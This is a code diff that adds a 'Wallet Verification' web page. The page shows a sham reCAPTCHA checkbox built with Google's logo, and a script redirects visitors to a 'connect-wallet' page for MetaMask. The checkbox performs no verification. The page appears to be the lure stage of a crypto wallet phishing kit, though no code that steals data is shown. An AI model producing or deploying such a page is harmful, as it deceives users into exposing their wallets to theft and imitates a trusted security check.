@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Wallet Verification</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body class="recaptcha-body">
+  <div class="recaptcha-container">
+    <div class="recaptcha-box">
+      <p class="verify-text">Please verify you're a human</p>
+      <div class="checkbox">
+        <input type="checkbox" id="check" />
+        <label for="check">I'm not a robot</label>
+        <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA" />
+      </div>
+      <button class="verify-btn">Verify</button>
+    </div>
+  </div>
+</body>
+</html>
+
+<!-- Inside <script> tag or in JS file -->
+<script>
+  document.querySelector('.verify-btn').addEventListener('click', () => {
+    // Simulate short delay before redirect
+    setTimeout(() => {
+      // Replace "Metamask" with the dynamic wallet name if you're passing it via URL
+      window.location.href = "connect-wallet.html?wallet=Metamask";
+    }, 1000);
+  });
+</script>
